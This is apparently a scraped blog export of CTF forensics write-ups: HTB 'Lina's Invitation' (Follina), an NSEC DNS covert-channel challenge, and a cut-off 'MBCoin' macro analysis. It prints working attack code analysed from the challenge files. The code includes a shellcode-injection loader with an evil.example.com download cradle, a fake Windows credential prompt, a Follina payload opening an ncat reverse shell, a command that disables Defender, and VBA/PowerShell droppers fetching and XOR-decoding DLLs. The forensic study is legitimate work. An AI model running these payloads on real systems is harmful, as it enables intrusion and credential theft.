Metasploit Payload using the exploit/multi/script/web_delivery module Author: Jared Haight (@jaredhaight) License: MIT Required Dependencies: None Optional Dependencies: None .DESCRIPTION Spawns a new, hidden PowerShell window that downloads and executes a Metasploit payload from a specified URL. This relies on the exploit/multi/scripts/web_delivery metasploit module. The web_delivery module generates a script for a given payload and then fires up a webserver to host said script. If the payload is a reverse shell, it will also handle starting up the listener for that payload. An example rc file is below (or you can just type the commands manually). It does the following: * Sets the download cradle to port 8443 (SRVPORT) on all IPs (SRVHOST) * Sets the script target to PowerShell (set target 2) * Sets the payload being served to windows/meterpreter/reverse_https * Sets the payload to listen on port 443 (LPORT) on all IPs (LHOST) if ($Shellcode64.Length -eq 0) { Throw \u0026#39;No shellcode was placed in the $Shellcode64 variable!\u0026#39; return } $Shellcode = $Shellcode64 Write-Verbose \u0026#39;Using 64-bit shellcode.\u0026#39; } # Allocate RWX memory for the shellcode $BaseAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX) if (!$BaseAddress) { Throw \u0026#34;Unable to allocate shellcode memory in PID: $ProcessID\u0026#34; } Write-Verbose \u0026#34;Shellcode memory reserved at 0x$($BaseAddress.ToString(\u0026#34;X$([IntPtr]::Size*2)\u0026#34;))\u0026#34; # Copy shellcode to RWX buffer [System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $BaseAddress, $Shellcode.Length) # Get address of ExitThread function $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread if ($PowerShell32bit) { $CallStub = Emit-CallThreadStub $BaseAddress $ExitThreadAddr 32 Write-Verbose \u0026#39;Emitting 32-bit assembly call stub.\u0026#39; } else { $CallStub = Emit-CallThreadStub $BaseAddress $ExitThreadAddr 64 Write-Verbose \u0026#39;Emitting 64-bit assembly call stub.\u0026#39; } # Allocate RWX memory for the thread call stub $CallStubAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $CallStub.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX) if (!$CallStubAddress) { Throw \u0026#34;Unable to allocate thread call stub.\u0026#34; } Write-Verbose \u0026#34;Thread call stub memory reserved at 0x$($CallStubAddress.ToString(\u0026#34;X$([IntPtr]::Size*2)\u0026#34;))\u0026#34; # Copy call stub to RWX buffer [System.Runtime.InteropServices.Marshal]::Copy($CallStub, 0, $CallStubAddress, $CallStub.Length) # Launch shellcode in it\u0026#39;s own thread $ThreadHandle = $CreateThread.Invoke([IntPtr]::Zero, 0, $CallStubAddress, $BaseAddress, 0, [IntPtr]::Zero) if (!$ThreadHandle) { Throw \u0026#34;Unable to launch thread.\u0026#34; } .PARAMETER url This is the URL for the download cradle, by default it will be something like \u0026#34;https://evil.example.com/[Random Chars]\u0026#34; .EXAMPLE PS C:\\\u0026gt;Invoke-MetasploitPayload -url https://evil.example.com/2k1isEdsl Downloads and executes a Metasploit payload located at https://evil.example.com/2k1isEdsl .NOTES You can use the \u0026#34;-verbose\u0026#34; option for verbose output. .LINK Github: https://github.com/jaredhaight/Invoke-MetasploitPayload #\u0026gt;\u0026#39; function Invoke-LoginPrompt{ $cred = $Host.ui.PromptForCredential(\u0026#34;Windows Security\u0026#34;, \u0026#34;R{DESCRIPTION}\u0026#34;, \u0026#34;$env:userdomain\\$env:username\u0026#34;,\u0026#34;\u0026#34;) $username = \u0026#34;$env:username\u0026#34; $domain = \u0026#34;$env:userdomain\u0026#34; $full = \u0026#34;$domain\u0026#34; + \u0026#34;\\\u0026#34; + \u0026#34;$username\u0026#34; $password = $cred.GetNetworkCredential().password Add-Type -assemblyname System.DirectoryServices.AccountManagement $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine) while($DS.ValidateCredentials(\u0026#34;$full\u0026#34;,\u0026#34;$password\u0026#34;) -ne $True){ $cred = $Host.ui.PromptForCredential(\u0026#34;Windows Security\u0026#34;, \u0026#34;Invalid Credentials, Please try again\u0026#34;, \u0026#34;$env:userdomain\\$env:username\u0026#34;,\u0026#34;\u0026#34;) $username = \u0026#34;$env:username\u0026#34; $domain = \u0026#34;$env:userdomain\u0026#34; $full = \u0026#34;$domain\u0026#34; + \u0026#34;\\\u0026#34; + \u0026#34;$username\u0026#34; $password = $cred.GetNetworkCredential().password Add-Type -assemblyname System.DirectoryServices.AccountManagement $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine) $DS.ValidateCredentials(\u0026#34;$full\u0026#34;, \u0026#34;$password\u0026#34;) | out-null } $output = $newcred = $cred.GetNetworkCredential() | select-object UserName, Domain, Password $output R{START_PROCESS} } I wasn\u0026rsquo;t really sure what I was doing that for, but I was hoping that maybe in that last one, there could have been a hard-coded username and the flag as the password? Something like that could have been the challenge but no. I finally saw the next section and knew that would be much more interesting:\n\u0026lt;script\u0026gt; location.href = \u0026#34;ms-msdt:/id PCWDiagnostic /skip force /param \\\u0026#34;IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression(\u0026#39;[System.Text.Encoding]\u0026#39;+[char]58+[char]58+\u0026#39;Unicode.GetString([System.Convert]\u0026#39;+[char]58+[char]58+\u0026#39;FromBase64String(\u0026#39;+[char]34+\u0026#39;YwA6AFwAXAB3AGkAbgBkAG8AdwBzAFwAXABzAHkAcwB0AGUAbQAzADIAXABcAGMAbQBkAC4AZQB4AGUAIAAvAGMAIABuAGMAYQB0ACAAdwB3AHcALgB3AGkAbgBkAG8AdwBzAGwAaQB2AGUAdQBwAGQAYQB0AGUAcgAuAGMAbwBtACAANQA0ADcANgAgAC0AZQAgAGMAbQBkAC4AZQB4AGUAOwAgACQAcAB0ADEAPQBcACIASABUAEIAewBaAGUAcgAwAF8ARABhAHkAWgBfADQAUgBlAF8AQwAwAE8AbABfAEIAdQBUAF8AXAAiAA==\u0026#39;+[char]34+\u0026#39;))\u0026#39;))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\\u0026#34;\u0026#34;; \u0026lt;/script\u0026gt; That looks more like the continuation of the Follina exploit.\nWe can see that the Invoke-Expression is going to execute some base64 decoded string, which is the following:\nc:\\\\windows\\\\system32\\\\cmd.exe /c ncat www.windowsliveupdater.com 5476 -e cmd.exe; $pt1=\\\u0026#34;HTB{Zer0_DayZ_4Re_C0Ol_BuT_\\\u0026#34; We can find part 1 of our flag HTB{Zer0_DayZ_4Re_C0Ol_BuT_ and see that the attacker opened a command prompt.\nTrying to find the next part of the flag, we can see that the next stream is very interesting. We can open it with \u0026ldquo;Follow TCP Stream\u0026rdquo;:\nHere is the full transcript:\nMicrosoft Windows [Version 10.0.19044.1288] (c) Microsoft Corporation. All rights reserved. C:\\Users\\Alex\\AppData\\Local\\Temp\\SDIAG_7fea096c-9dbc-45b9-89f7-4924577d60ce\u0026gt;whoami whoami desktop-as65e90\\alex C:\\Users\\Alex\\AppData\\Local\\Temp\\SDIAG_7fea096c-9dbc-45b9-89f7-4924577d60ce\u0026gt;cd C:\\Users\\Alex cd C:\\Users\\Alex C:\\Users\\Alex\u0026gt;cd Desktop cd Desktop C:\\Users\\Alex\\Desktop\u0026gt;dir dir Volume in drive C has no label. Volume Serial Number is E6F0-A472 Directory of C:\\Users\\Alex\\Desktop 07/04/2022 06:51 AM \u0026lt;DIR\u0026gt; . 07/04/2022 06:51 AM \u0026lt;DIR\u0026gt; .. 05/29/2022 10:27 AM 3,719 bc.ps1 06/14/2022 10:50 PM 2,282 Google Chrome.lnk 06/23/2022 03:52 AM 2,355 Microsoft Teams.lnk 07/03/2022 12:52 PM 111 Notes.txt 4 File(s) 8,467 bytes 2 Dir(s) 41,921,138,688 bytes free C:\\Users\\Alex\\Desktop\u0026gt;type Notes.txt type Notes.txt Personal Vault Email password: B3stCEO0fAllTime2022 Password Vault: Sup3rSecureP@ssw0rdToAcC3ssA11MyP@ssw0rds C:\\Users\\Alex\\Desktop\u0026gt;cd C:\\Users\\Public cd C:\\Users\\Public C:\\Users\\Public\u0026gt;powershell.exe -enc LgAgACgAIAAkAGUAbgBWADoAYwBvAG0AUwBwAGUAYwBbADQALAAyADQALAAyADUAXQAtAEoATwBpAG4AJwAnACkAIAAoACAAKAAoACgAIgB7ADIAfQB7ADAAfQB7ADcAfQB7ADEAfQB7ADEAMQB9AHsANQB9AHsANgB9AHsAOQB9AHsAMQAwAH0AewA0AH0AewA4AH0AewAzAH0AIgAtAGYAIAAnAGUAZgAnACwAJwAgACcALAAnAFMAZQB0AC0ATQBwAFAAcgAnACwAJwB1AGUAJwAsACcAdAAnACwAJwBhAGwAdABpAG0AZQAnACwAJwBNAG8AbgBpACcALAAnAGUAcgBlAG4AYwBlACcALAAnAHIAJwAsACcAdABvAHIAJwAsACcAaQBuAGcAIABLADMANQAnACwAJwAtAEQAaQBzAGEAYgBsAGUAUgBlACcAKQApACAALQByAGUAcABMAGEAYwBFACAAIAAnAEsAMwA1ACcALABbAEMAaABBAFIAXQAzADYAKQApAA== powershell.exe -enc LgAgACgAIAAkAGUAbgBWADoAYwBvAG0AUwBwAGUAYwBbADQALAAyADQALAAyADUAXQAtAEoATwBpAG4AJwAnACkAIAAoACAAKAAoACgAIgB7ADIAfQB7ADAAfQB7ADcAfQB7ADEAfQB7ADEAMQB9AHsANQB9AHsANgB9AHsAOQB9AHsAMQAwAH0AewA0AH0AewA4AH0AewAzAH0AIgAtAGYAIAAnAGUAZgAnACwAJwAgACcALAAnAFMAZQB0AC0ATQBwAFAAcgAnACwAJwB1AGUAJwAsACcAdAAnACwAJwBhAGwAdABpAG0AZQAnACwAJwBNAG8AbgBpACcALAAnAGUAcgBlAG4AYwBlACcALAAnAHIAJwAsACcAdABvAHIAJwAsACcAaQBuAGcAIABLADMANQAnACwAJwAtAEQAaQBzAGEAYgBsAGUAUgBlACcAKQApACAALQByAGUAcABMAGEAYwBFACAAIAAnAEsAMwA1ACcALABbAEMAaABBAFIAXQAzADYAKQApAA== C:\\Users\\Public\u0026gt;certutil -urlcache -split -f \u0026#34;https://github.com/carlospolop/PEASS-ng/releases/download/20220703/winPEASany.exe\u0026#34; winpeas.exe certutil -urlcache -split -f \u0026#34;https://github.com/carlospolop/PEASS-ng/releases/download/20220703/winPEASany.exe\u0026#34; winpeas.exe **** Online **** 000000 ... 1d8e00 CertUtil: -URLCache command completed successfully. C:\\Users\\Public\u0026gt;dir dir Volume in drive C has no label. Volume Serial Number is E6F0-A472 Directory of C:\\Users\\Public 07/03/2022 01:06 PM \u0026lt;DIR\u0026gt; . 07/03/2022 01:06 PM \u0026lt;DIR\u0026gt; .. 06/08/2022 11:31 AM \u0026lt;DIR\u0026gt; BlueStacks 06/14/2022 09:17 AM \u0026lt;DIR\u0026gt; Documents 12/07/2019 02:14 AM \u0026lt;DIR\u0026gt; Downloads 06/24/2022 09:20 AM 600,580 GenericProcess.ps1 12/07/2019 02:14 AM \u0026lt;DIR\u0026gt; Music 12/07/2019 02:14 AM \u0026lt;DIR\u0026gt; Pictures 12/07/2019 02:14 AM \u0026lt;DIR\u0026gt; Videos 07/04/2022 07:50 AM 1,936,896 winpeas.exe 2 File(s) 2,537,476 bytes 8 Dir(s) 41,909,522,432 bytes free C:\\Users\\Public\u0026gt;powershell.exe -enc IABJAGUAeAAgACgAIAAoACgAKAAiAHsAMgB9AHsANwB9AHsANgB9AHsANQB9AHsAOQB9AHsAMAB9AHsAOAB9AHsAMwB9AHsAMQAwAH0AewA0AH0AewAxAH0AIgAgAC0AZgAgACcAaAAnACwAJwAuAGUAeABlACcALAAnADwAIwB7ADAAJwAsACcAIQB9ACcALAAnAGUAYQBzACcALAAnAEEAJwAsACcAdAAzAD0AYgAzADMAbgBfAHAAJwAsACcAfQBwACcALAAnADMAZAAnACwAJwB0AGMAJwAsACcAIwA+ACAALgB7ADEAfQB3AGkAbgBwACcAKQApAC0AZgAgACAAWwBDAGgAYQByAF0AMwA2ACwAWwBDAGgAYQByAF0AOQAyACkAKQA= powershell.exe -enc IABJAGUAeAAgACgAIAAoACgAKAAiAHsAMgB9AHsANwB9AHsANgB9AHsANQB9AHsAOQB9AHsAMAB9AHsAOAB9AHsAMwB9AHsAMQAwAH0AewA0AH0AewAxAH0AIgAgAC0AZgAgACcAaAAnACwAJwAuAGUAeABlACcALAAnADwAIwB7ADAAJwAsACcAIQB9ACcALAAnAGUAYQBzACcALAAnAEEAJwAsACcAdAAzAD0AYgAzADMAbgBfAHAAJwAsACcAfQBwACcALAAnADMAZAAnACwAJwB0AGMAJwAsACcAIwA+ACAALgB7ADEAfQB3AGkAbgBwACcAKQApAC0AZgAgACAAWwBDAGgAYQByAF0AMwA2ACwAWwBDAGgAYQByAF0AOQAyACkAKQA= C:\\Users\\Public\u0026gt;exit exit Among other things are some clear text passwords from the Notes.txt file, two encoded powershell command and a download of winPEAS.exe.\nThe first powershell resolves to\n. ( $enV:comSpec[4,24,25]-JOin\u0026#39;\u0026#39;) ( (((\u0026#34;{2}{0}{7}{1}{11}{5}{6}{9}{10}{4}{8}{3}\u0026#34;-f \u0026#39;ef\u0026#39;,\u0026#39; \u0026#39;,\u0026#39;Set-MpPr\u0026#39;,\u0026#39;ue\u0026#39;,\u0026#39;t\u0026#39;,\u0026#39;altime\u0026#39;,\u0026#39;Moni\u0026#39;,\u0026#39;erence\u0026#39;,\u0026#39;r\u0026#39;,\u0026#39;tor\u0026#39;,\u0026#39;ing K35\u0026#39;,\u0026#39;-DisableRe\u0026#39;)) -repLacE \u0026#39;K35\u0026#39;,[ChAR]36)) And the second resolves to\nIex ( (((\u0026#34;{2}{7}{6}{5}{9}{0}{8}{3}{10}{4}{1}\u0026#34; -f \u0026#39;h\u0026#39;,\u0026#39;.exe\u0026#39;,\u0026#39;\u0026lt;#{0\u0026#39;,\u0026#39;!}\u0026#39;,\u0026#39;eas\u0026#39;,\u0026#39;A\u0026#39;,\u0026#39;t3=b33n_p\u0026#39;,\u0026#39;}p\u0026#39;,\u0026#39;3d\u0026#39;,\u0026#39;tc\u0026#39;,\u0026#39;#\u0026gt; .{1}winp\u0026#39;))-f [Char]36,[Char]92)) We can see that the second one has some l33t speak in it, which made it much more interesting. Using a bit of python, we can check what they are actually doing:\n\u0026gt;\u0026gt;\u0026gt; a = [\u0026#39;h\u0026#39;,\u0026#39;.exe\u0026#39;,\u0026#39;\u0026lt;#{0\u0026#39;,\u0026#39;!}\u0026#39;,\u0026#39;eas\u0026#39;,\u0026#39;A\u0026#39;,\u0026#39;t3=b33n_p\u0026#39;,\u0026#39;}p\u0026#39;,\u0026#39;3d\u0026#39;,\u0026#39;tc\u0026#39;,\u0026#39;#\u0026gt; .{1}winp\u0026#39;] \u0026gt;\u0026gt;\u0026gt; \u0026#34;\u0026#34;.join([a[x] for x in [2,7,6,5,9,0,8,3,10,4,1]]) \u0026#39;\u0026lt;#{0}pt3=b33n_pAtch3d!}#\u0026gt; .{1}winpeas.exe\u0026#39; Which resolves to the following with the second -f: \u0026lt;#$pt3=b33n_pAtch3d!}#\u0026gt; .\\winpeas.exe\nOk, so that is part 3 of the flag\u0026hellip; but I wanted part 2.\nHTB{Zer0_DayZ_4Re_C0Ol_BuT_ b33n_pAtch3d!} Looking around some more in the pcap, there is another interesting stream. In the stream 12, we can find the download of a few files, but most of them are send in chunks, throught HTTP 206 Partial Content. The last one is not, so we can try to start by looking at that one.\nLooking at the magic bytes (Cr24) or using file, we can identify the file as a chrome extension. We can use this website to explore the extension\u0026rsquo;s files.\nWe can search online about \u0026ldquo;zxcvbn data\u0026rdquo; and find out that this is an extension that is used by Google to check for weak passwords. My first thought was that we have the version of the extension, maybe we can find the official release and compare the content of the files. The second part may be inserted in one of the files. I tried to do a quick search first for anything with an underscore, with the assumption that that second part of the flag would have more than one word, and it would be easily recognizable as l33t speak. I had no luck with that search.\nI then decided to look at the other files, but needed to find a way to extract them from all the Partial Contents. Using tshark, we can extract all http object using the following:\ntshark -r capture.pcapng --export-objects http,objs This gave us the following objects, where we can see 2132f61f, c78f9967 and f08b21db as our three extensions.\nf08b21db is the one we already looked at, since it wasn\u0026rsquo;t sent in chunks.\nWe can recreate the other two files very simply by using cat c78* \u0026gt; c78 and cat 213* \u0026gt; 213, and then open them in the website.\nBoth of these looked very legit. I took a while digging in them, trying to find out if there could be something that would be hidden among all the data. The idea of finding the official release for those extensions and diffing the content kept coming back, but somehow I did not do it.\nAfter a while, I was talking wtih another team member who really believe it was a dead end.\nSooo, none of the crx would be the last part? Weird to have included them then I did not believe it would be there for no reason\u0026hellip; but it did make me think about something else:\nWhy are the crx useless... wait... we have a word doc... why do we have that other full file then? Maybe there was more to it than \u0026ldquo;being the first phase in the Follina exploit\u0026rdquo;.\nSome readers may have seen it already, but if we look back at the External Dependencies of the docx file, we can see the last line commented out:\n\u0026lt;!--Relationship Id=\u0026#34;rOlsk\u0026#34; Type=http://windowsliveupdater.com?Pt2=RjBsbGluYV9oNHNf--\u0026gt; That \u0026ldquo;Pt2\u0026rdquo; key now can\u0026rsquo;t be ignored. The second part is base64 encoded, and resolves to F0llina_h4s_\nThe full flag becomes HTB{Zer0_DayZ_4Re_C0Ol_BuT_F0llina_h4s_b33n_pAtch3d!}.\nP.S. Only once I actually finished writing my writeup for Lina\u0026rsquo;s Invitation that I realized\u0026hellip; it wasn\u0026rsquo;t Lina\u0026rsquo;s\u0026hellip; it was Fol-Lina\u0026rsquo;s Invitation. :)\n"},{"uri":"https://n1trate.github.io/writeups/nsec-2022/portobello-denial/","title":"Portobello - Denial","tags":[],"description":"","content":"Challenge statement:\nAny data leaving or entering the Mycoverse goes through our AI-backed deep packet inspection appliance. The vendor told us that this box was what we needed. At this price tag, I know he’s right. Why do you need DNS logs anyway? We both know that DNS servers are just address books of Internet resources and I’ve never seen anyone abuse a plain old address book. The appliance would have blocked anything malicious anyway. I bet you don’t even have a certification to understand the protocol anyway. Don’t waste your time on the network capture, I skimmed throught it and found that your test device fd00:6e73:6563:3232::beef did nothing suspicious. Rosie Meyer - A+, Server+, CCNA, CCNP, CCIE, MSDST, CSM Network Admin We need to download the pcap. This is going to be the same pcap for all Portobello challenges.\nWe can start by taking a look at what we have. In wireshark, we can use the following filter to see only what is related to the ip at hand ipv6.src == fd00:6e73:6563:3232::beef || ipv6.dst == fd00:6e73:6563:3232::beef.\nWe can see that the subdomain to lag-dns-cannot-be-abused-pinky-swear.ctf in the first query is f, then o, then r\u0026hellip; So we can keep scrolling trying to see what it could be. We end up very soon on the word flag:\nforgetspaceaboutspacesafespaceprotocolsspace flag dashd\u0026hellip;\nWe can filter on queries only, and see even better what is getting written out:\nBy reading it until we get to the next \u0026ldquo;space\u0026rdquo; word, we can get the first flag.\nflag-dns-as-covert-communication-channels\nFlag submission:\nPortobello 53 - Denial (1/2) | 1 | I hope the server can interpret covert queries (1/2) Forum message:\nI bet this is just a malformed DNS query. There’s no way a server would answer to this. The forum message was the hint for the other flag. The answer is key to understanding which subdomain is important.\nLooking at the patterns, we can see that there is a lot less successful responses than NXDOMAIN. We can filter them and get all the successful answer\u0026rsquo;s subdomains together with this:\n$ tshark -r portobello53.pcapng -Y \u0026#34;ipv6.dst == fd00:6e73:6563:3232::beef\u0026#34; | grep pinky | grep -v \u0026#34;No such\u0026#34; | awk \u0026#39;{print $13}\u0026#39; | cut -d. -f1 | tr -d \u0026#39;\\n\u0026#39; flagdashdnsdashserverhidinginternetnoise This gives us the flag:\nflag-dns-serverhidinginternetnoise\nFlag submission:\nPortobello 53 - Denial (2/2) | 1 | Ouch - A two-way covert communication channel. Watch the client proceed to the next stage of grief (2/2) Forum message:\nA server answering correctly to your arbitrary DNS queries. That’s not the kind of thing that would take the Mycoverse down. "},{"uri":"https://n1trate.github.io/writeups/htb-business-ctf-2022-dirty-money/mbcoin/","title":"MBCoin","tags":[],"description":"","content":"Challenge statement:\nWe have been actively monitoring the most extensive spear-phishing campaign in recent history for the last two months. This campaign abuses the current crypto market crash to target disappointed crypto owners. A company's SOC team detected and provided us with a malicious email and some network traffic assessed to be associated with a user opening the document. Analyze the supplied files and figure out what happened.\nThis writeup is a story of collaboration, mistakes, and sleep deprivation. We had a great time.\nWhat was the first mistake\u0026hellip; probably starting the challenge around 1:15 AM. I had just sovled Lina\u0026rsquo;s Invitation and should have stopped there but\u0026hellip;\nIt started by downloading the challenge files, in which we can find a pcap and a doc.\nOpening the doc first, we can see a classic phishing document.\nSince we got a warning related to the macros when opening the file, it\u0026rsquo;s worth to check out what there are.\nWe can find the following macro wants to get executed when opening the file:\nRem Attribute VBA_ModuleType=VBAModule Option VBASupport 1 Sub AutoOpen() Dim QQ1 As Object Set QQ1 = ActiveDocument.Shapes(1) Dim QQ2 As Object Set QQ2 = ActiveDocument.Shapes(2) RO = StrReverse(\u0026#34;\\ataDmargorP\\:C\u0026#34;) ROI = RO + StrReverse(\u0026#34;sbv.nip\u0026#34;) ii = StrReverse(\u0026#34;\u0026#34;) Ne = StrReverse(\u0026#34;IZOIZIMIZI\u0026#34;) WW = QQ1.AlternativeText + QQ2.AlternativeText MyFile = FreeFile Open ROI For Output As #MyFile Print #MyFile, WW Close #MyFile fun = Shell(StrReverse(\u0026#34;sbv.nip\\ataDmargorP\\:C exe.tpircsc k/ dmc\u0026#34;), Chr(48)) waitTill = Now() + TimeValue(\u0026#34;00:00:05\u0026#34;) While Now() \u0026lt; waitTill Wend MsgBox (\u0026#34;Unfortunately you are not eligable for free coin!\u0026#34;) End End Sub This script tries to write the value of QQ1.AlternativeText + QQ2.AlternativeText in a file named pin.vbs, and then execute it. QQ1 and QQ2 are two shapes in the document.\nSomehow, in my LibreOffice, I couldn\u0026rsquo;t get the AlternativeText of the shapes.\nI asked someone on my team, and they were able to give me the two chunks of code:\nDim WAITPLZ, WS, k, kl WAITPLZ = DateAdd(Chr(115), 4, Now()) Do Until (Now() \u0026gt; WAITPLZ) Loop LL1 = \u0026#34;$Nano=\u0026#39;JOOEX\u0026#39;.replace(\u0026#39;JOO\u0026#39;,\u0026#39;I\u0026#39;);sal OY $Nano;$aa=\u0026#39;(New-Ob\u0026#39;; $qq=\u0026#39;ject Ne\u0026#39;; $ww=\u0026#39;t.WebCli\u0026#39;; $ee=\u0026#39;ent).Downl\u0026#39;; $rr=\u0026#39;oadFile\u0026#39;; $bb=\u0026#39;(\u0026#39;\u0026#39;http://priyacareers.htb/u9hDQN9Yy7g/pt.html\u0026#39;\u0026#39;,\u0026#39;\u0026#39;C:\\ProgramData\\www1.dll\u0026#39;\u0026#39;)\u0026#39;;$FOOX =($aa,$qq,$ww,$ee,$rr,$bb,$cc -Join \u0026#39;\u0026#39;); OY $FOOX|OY;\u0026#34; LL2 = \u0026#34;$Nanoz=\u0026#39;JOOEX\u0026#39;.replace(\u0026#39;JOO\u0026#39;,\u0026#39;I\u0026#39;);sal OY $Nanoz;$aa=\u0026#39;(New-Ob\u0026#39;; $qq=\u0026#39;ject Ne\u0026#39;; $ww=\u0026#39;t.WebCli\u0026#39;; $ee=\u0026#39;ent).Downl\u0026#39;; $rr=\u0026#39;oadFile\u0026#39;; $bb=\u0026#39;(\u0026#39;\u0026#39;https://perfectdemos.htb/Gv1iNAuMKZ/jv.html\u0026#39;\u0026#39;,\u0026#39;\u0026#39;C:\\ProgramData\\www2.dll\u0026#39;\u0026#39;)\u0026#39;;$FOOX =($aa,$qq,$ww,$ee,$rr,$bb,$cc -Join \u0026#39;\u0026#39;); OY $FOOX|OY;\u0026#34; LL3 = \u0026#34;$Nanox=\u0026#39;JOOEX\u0026#39;.replace(\u0026#39;JOO\u0026#39;,\u0026#39;I\u0026#39;);sal OY $Nanox;$aa=\u0026#39;(New-Ob\u0026#39;; $qq=\u0026#39;ject Ne\u0026#39;; $ww=\u0026#39;t.WebCli\u0026#39;; $ee=\u0026#39;ent).Downl\u0026#39;; $rr=\u0026#39;oadFile\u0026#39;; $bb=\u0026#39;(\u0026#39;\u0026#39;http://bussiness-z.htb/ze8pCNTIkrIS/wp.html\u0026#39;\u0026#39;,\u0026#39;\u0026#39;C:\\ProgramData\\www3.dll\u0026#39;\u0026#39;)\u0026#39;;$FOOX =($aa,$qq,$ww,$ee,$rr,$bb,$cc -Join \u0026#39;\u0026#39;); OY $FOOX|OY;\u0026#34; LL4 = \u0026#34;$Nanoc=\u0026#39;JOOEX\u0026#39;.replace(\u0026#39;JOO\u0026#39;,\u0026#39;I\u0026#39;);sal OY $Nanoc;$aa=\u0026#39;(New-Ob\u0026#39;; $qq=\u0026#39;ject Ne\u0026#39;; $ww=\u0026#39;t.WebCli\u0026#39;; $ee=\u0026#39;ent).Downl\u0026#39;; $rr=\u0026#39;oadFile\u0026#39;; $bb=\u0026#39;(\u0026#39;\u0026#39;http://cablingpoint.htb/ByH5NDoE3kQA/vm.html\u0026#39;\u0026#39;,\u0026#39;\u0026#39;C:\\ProgramData\\www4.dll\u0026#39;\u0026#39;)\u0026#39;;$FOOX =($aa,$qq,$ww,$ee,$rr,$bb,$cc -Join \u0026#39;\u0026#39;); OY $FOOX|OY;\u0026#34; LL5 = \u0026#34;$Nanoc=\u0026#39;JOOEX\u0026#39;.replace(\u0026#39;JOO\u0026#39;,\u0026#39;I\u0026#39;);sal OY $Nanoc;$aa=\u0026#39;(New-Ob\u0026#39;; $qq=\u0026#39;ject Ne\u0026#39;; $ww=\u0026#39;t.WebCli\u0026#39;; $ee=\u0026#39;ent).Downl\u0026#39;; $rr=\u0026#39;oadFile\u0026#39;; $bb=\u0026#39;(\u0026#39;\u0026#39;https://bonus.corporatebusinessmachines.htb/1Y0qVNce/tz.html\u0026#39;\u0026#39;,\u0026#39;\u0026#39;C:\\ProgramData\\www5.dll\u0026#39;\u0026#39;)\u0026#39;;$FOOX =($aa,$qq,$ww,$ee,$rr,$bb,$cc -Join \u0026#39;\u0026#39;); OY $FOOX|OY;\u0026#34; HH9=\u0026#34;po\u0026#34; HH8=\u0026#34;wers\u0026#34; HH7=\u0026#34;h\u0026#34; HH6=\u0026#34;ell \u0026#34; HH0= HH9+HH8+HH7+HH6 Set Ran = CreateObject(\u0026#34;wscript.shell\u0026#34;) Ran.Run HH0+LL1,Chr(48) Ran.Run HH0+LL2,Chr(48) Ran.Run HH0+LL3,Chr(48) Ran.Run HH0+LL4,Chr(48) Ran.Run HH0+LL5,Chr(48) Wscript.Sleep(5000) MM1 = \u0026#34;$b = [System.IO.File]::ReadAllBytes(((\u0026#39;C:GPH\u0026#39;+\u0026#39;pr\u0026#39;+\u0026#39;og\u0026#39;+\u0026#39;ra\u0026#39;+\u0026#39;mdataG\u0026#39;+\u0026#39;PHwww1.d\u0026#39;+\u0026#39;ll\u0026#39;) -CrePLacE\u0026#39;GPH\u0026#39;,[Char]92)); $k = (\u0026#39;6i\u0026#39;+\u0026#39;I\u0026#39;+\u0026#39;gl\u0026#39;+\u0026#39;o\u0026#39;+\u0026#39;Mk5\u0026#39;+\u0026#39;iRYAw\u0026#39;+\u0026#39;7Z\u0026#39;+\u0026#39;TWed0Cr\u0026#39;+\u0026#39;juZ9wijyQDj\u0026#39;+\u0026#39;KO\u0026#39;+\u0026#39;9Ms0D8K0Z2H5MX6wyOKqFxl\u0026#39;+\u0026#39;Om1\u0026#39;+\u0026#39;X\u0026#39;+\u0026#39;pjmYfaQX\u0026#39;+\u0026#39;acA6\u0026#39;); $r = New-Object Byte[] $b.length; for($i=0; $i -lt $b.length; $i++){$r[$i] = $b[$i] -bxor $k[$i%$k.length]}; if ($r.length -gt 0) { [System.IO.File]::WriteAllBytes(((\u0026#39;C:Y9Apro\u0026#39;+\u0026#39;gramdat\u0026#39;+\u0026#39;a\u0026#39;+\u0026#39;Y\u0026#39;+\u0026#39;9Awww\u0026#39;+\u0026#39;.d\u0026#39;+\u0026#39;ll\u0026#39;).REpLace(([chAr]89+[chAr]57+[chAr]65),[sTriNg][chAr]92)), $r)}\u0026#34; MM2 = \u0026#34;$b = [System.IO.File]::ReadAllBytes(((\u0026#39;C:GPH\u0026#39;+\u0026#39;pr\u0026#39;+\u0026#39;og\u0026#39;+\u0026#39;ra\u0026#39;+\u0026#39;mdataG\u0026#39;+\u0026#39;PHwww2.d\u0026#39;+\u0026#39;ll\u0026#39;) -CrePLacE\u0026#39;GPH\u0026#39;,[Char]92)); $k = (\u0026#39;6i\u0026#39;+\u0026#39;I\u0026#39;+\u0026#39;pc\u0026#39;+\u0026#39;o\u0026#39;+\u0026#39;Mk5\u0026#39;+\u0026#39;iRYAw\u0026#39;+\u0026#39;7Z\u0026#39;+\u0026#39;TWed0Cr\u0026#39;+\u0026#39;juZ9wijyQDj\u0026#39;+\u0026#39;Au\u0026#39;+\u0026#39;9Ms0D8K0Z2H5MX6wyOKqFxl\u0026#39;+\u0026#39;Om1\u0026#39;+\u0026#39;P\u0026#39;+\u0026#39;pjmYfaQX\u0026#39;+\u0026#39;acA6\u0026#39;); $r = New-Object Byte[] $b.length; for($i=0; $i -lt $b.length; $i++){$r[$i] = $b[$i] -bxor $k[$i%$k.length]}; if ($r.length -gt 0) {[System.IO.File]::WriteAllBytes(((\u0026#39;C:Y9Apro\u0026#39;+\u0026#39;gramdat\u0026#39;+\u0026#39;a\u0026#39;+\u0026#39;Y\u0026#39;+\u0026#39;9Awww\u0026#39;+\u0026#39;.d\u0026#39;+\u0026#39;ll\u0026#39;).REpLace(([chAr]89+[chAr]57+[chAr]65),[sTriNg][chAr]92)), $r)}\u0026#34; MM3 = \u0026#34;$b = 